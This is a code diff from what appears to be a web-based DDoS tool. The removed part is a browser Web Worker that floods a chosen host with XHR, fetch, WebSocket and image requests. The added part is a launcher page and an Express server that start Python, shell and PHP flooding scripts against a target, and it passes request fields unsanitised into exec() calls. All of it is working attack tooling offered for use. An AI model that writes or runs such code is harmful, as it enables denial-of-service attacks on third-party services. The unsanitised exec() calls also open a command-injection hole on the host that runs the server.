@@ -1,154 +1,116 @@
-let attackWorker = null;
-let isAttacking = false;
-let requestCount = 0;
-let startTime = null;
-
-function log(message) {
-    const logElement = document.getElementById('log');
-    const timestamp = new Date().toLocaleTimeString();
-    logElement.innerHTML += `[${timestamp}] ${message}<br>`;
-    logElement.scrollTop = logElement.scrollHeight;
-}
-
-function updateStatus(message) {
-    document.getElementById('status').innerHTML = `Status: ${message}`;
-}
-
-function startAttack() {
-    if (isAttacking) {
-        log("Attack already running!");
-        return;
-    }
-
-    const target = document.getElementById('target').value;
+// Frontend JavaScript
+function launchCombinedAttack() {
+    const target = document.getElementById('targetUrl').value;
     const port = document.getElementById('port').value;
     const duration = document.getElementById('duration').value;
+    const threads = document.getElementById('threads').value;
+    const statusDiv = document.getElementById('status');
+    const progressDiv = document.getElementById('attackProgress');
 
     if (!target) {
-        log("Error: Please enter target!");
+        statusDiv.innerHTML = 'Status: ERROR - Target URL required';
         return;
     }
 
-    // Create Web Worker for background attack
-    attackWorker = new Worker(URL.createObjectURL(new Blob([`
-        let requestCount = 0;
-        let stop = false;
+    statusDiv.innerHTML = 'Status: LAUNCHING COMBINED ATTACK...';
+    progressDiv.innerHTML = 'Initializing all attack vectors...';
 
-        function browserAttack(target, port) {
-            // Method 1: XHR Flood
-            function xhrFlood() {
-                if (stop) return;
-                try {
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('GET', 'http://' + target + ':' + port + '/?rand=' + Math.random(), true);
-                    xhr.timeout = 1000;
-                    xhr.onload = function() { requestCount++; };
-                    xhr.ontimeout = function() { requestCount++; };
-                    xhr.send();
-                } catch(e) {}
-            }
-
-            // Method 2: Fetch Flood
-            async function fetchFlood() {
-                if (stop) return;
-                try {
-                    await fetch('http://' + target + ':' + port + '/?rand=' + Math.random(), {
-                        method: 'GET',
-                        mode: 'no-cors',
-                        cache: 'no-cache'
-                    });
-                    requestCount++;
-                } catch(e) {}
-            }
-
-            // Method 3: WebSocket Flood
-            function wsFlood() {
-                if (stop) return;
-                try {
-                    const ws = new WebSocket('ws://' + target + ':' + port);
-                    ws.onopen = function() { requestCount++; ws.close(); };
-                    ws.onerror = function() { requestCount++; };
-                } catch(e) {}
-            }
-
-            // Method 4: Image Flood
-            function imgFlood() {
-                if (stop) return;
-                try {
-                    const img = new Image();
-                    img.src = 'http://' + target + ':' + port + '/image?rand=' + Math.random();
-                    img.onload = function() { requestCount++; };
-                    img.onerror = function() { requestCount++; };
-                } catch(e) {}
-            }
-
-            // Run all methods in parallel
-            setInterval(xhrFlood, 10);
-            setInterval(fetchFlood, 15);
-            setInterval(wsFlood, 20);
-            setInterval(imgFlood, 25);
-        }
-
-        self.onmessage = function(e) {
-            if (e.data.action === 'start') {
-                browserAttack(e.data.target, e.data.port);
-            } else if (e.data.action === 'stop') {
-                stop = true;
-            }
-        }
-    `], {type: 'text/javascript'})));
-
-    attackWorker.postMessage({
-        action: 'start',
-        target: target,
-        port: port
+    // Python Backend Attack
+    fetch('/python-attack', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ target, port, duration, threads })
+    })
+    .then(r => r.text())
+    .then(data => {
+        progressDiv.innerHTML += ' | Python: ACTIVE';
+    })
+    .catch(err => {
+        progressDiv.innerHTML += ' | Python: FAILED';
     });
 
-    isAttacking = true;
-    startTime = Date.now();
-    updateStatus("Attack Running");
+    // Shell Script Attack
+    fetch('/shell-attack', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ target, duration, threads })
+    })
+    .then(r => r.text())
+    .then(data => {
+        progressDiv.innerHTML += ' | Shell: ACTIVE';
+    })
+    .catch(err => {
+        progressDiv.innerHTML += ' | Shell: FAILED';
+    });
 
-    log(`Starting advanced attack on ${target}:${port}`);
-    log("Methods: XHR Flood, Fetch Flood, WebSocket Flood, Image Flood");
-
-    // Update stats every second
-    const statsInterval = setInterval(() => {
-        if (!isAttacking) {
-            clearInterval(statsInterval);
-            return;
-        }
-        const elapsed = Math.floor((Date.now() - startTime) / 1000);
-        updateStatus(`Attack Running - ${elapsed}s elapsed`);
-    }, 1000);
-
-    // Auto stop after duration
-    setTimeout(() => {
-        if (isAttacking) {
-            stopAttack();
-            log(`Attack completed after ${duration} seconds`);
-        }
-    }, duration * 1000);
+    // PHP Backend Attack
+    fetch('/php-attack', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `target=${encodeURIComponent(target)}&duration=${duration}&threads=${threads}`
+    })
+    .then(r => r.text())
+    .then(data => {
+        progressDiv.innerHTML += ' | PHP: ACTIVE';
+        statusDiv.innerHTML = 'Status: ALL ATTACKS LAUNCHED';
+    })
+    .catch(err => {
+        progressDiv.innerHTML += ' | PHP: FAILED';
+    });
 }
 
-function stopAttack() {
-    if (attackWorker) {
-        attackWorker.postMessage({ action: 'stop' });
-        attackWorker.terminate();
-        attackWorker = null;
-    }
-    isAttacking = false;
-    updateStatus("Stopped");
-    log("Attack stopped by user");
-}
+// Backend Server (Node.js/Express)
+const express = require('express');
+const { exec, spawn } = require('child_process');
+const path = require('path');
+const bodyParser = require('body-parser');
 
-function connectToBackend() {
-    const target = document.getElementById('target').value;
-    if (!target) {
-        log("Error: Enter target first!");
-        return;
-    }
+const app = express();
+
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static(__dirname));
+
+// Python Attack Endpoint
+app.post('/python-attack', (req, res) => {
+    const { target, port, duration, threads } = req.body;
     
-    log("Connecting to Python backend...");
-    // Backend connection logic would go here
-    log("Backend connection feature requires server setup");
-}
+    const pythonProcess = spawn('python3', [
+        path.join(__dirname, 'tools_ddos.py'),
+        target, port, duration, threads
+    ]);
+
+    pythonProcess.stdout.on('data', (data) => {
+        console.log(`Python: ${data}`);
+    });
+
+    res.send('Python attack initiated');
+});
+
+// Shell Attack Endpoint  
+app.post('/shell-attack', (req, res) => {
+    const { target, duration, threads } = req.body;
+    
+    exec(`chmod +x ${path.join(__dirname, 'tools_ddos2.sh')} && ${path.join(__dirname, 'tools_ddos2.sh')} "${target}" ${duration} ${threads}`,
+        (error, stdout, stderr) => {
+            console.log(`Shell: ${stdout || stderr}`);
+        });
+
+    res.send('Shell attack initiated');
+});
+
+// PHP Attack Endpoint
+app.post('/php-attack', (req, res) => {
+    const { target, duration, threads } = req.body;
+    
+    exec(`php ${path.join(__dirname, 'tools_ddos3.php')} "${target}" ${duration} ${threads}`,
+        (error, stdout, stderr) => {
+            console.log(`PHP: ${stdout || stderr}`);
+        });
+
+    res.send('PHP attack initiated');
+});
+
+app.listen(3000, '0.0.0.0', () => {
+    console.log('DDoS server running on port 3000');
+});
